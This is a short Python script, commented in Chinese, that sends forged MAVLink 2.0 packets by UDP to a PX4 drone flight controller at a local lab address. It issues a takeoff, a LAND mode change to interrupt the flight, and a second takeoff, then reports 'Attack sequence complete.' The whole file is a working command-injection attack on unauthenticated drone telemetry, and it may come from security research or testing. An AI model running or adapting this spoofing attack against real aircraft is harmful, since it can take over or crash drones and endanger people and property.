import socket
import time

# PX4 接收地址
target_ip = "192.168.234.129"
target_port = 14550

# 构造 MAVLink2.0 伪造数据（由用户提供）
takeoff_hex = "fd2000ff72ffbe4c0000000080bf00000000000000000000c07f0000c07f0000c07f3ac5a0411600010140cf"
land_hex    = "fd0600ff12ffbe0b00007054"

# 转换为二进制数据
takeoff_msg = bytes.fromhex(takeoff_hex)
land_msg    = bytes.fromhex(land_hex)

# 创建 UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("[INFO] Sending TAKEOFF command...")
sock.sendto(takeoff_msg, (target_ip, target_port))

time.sleep(5)

print("[INFO] Sending SET_MODE (LAND) command to interrupt flight...")
sock.sendto(land_msg, (target_ip, target_port))

time.sleep(5)

print("[INFO] Re-sending TAKEOFF command after interruption...")
sock.sendto(takeoff_msg, (target_ip, target_port))

sock.close()
print("[INFO] Attack sequence complete.")


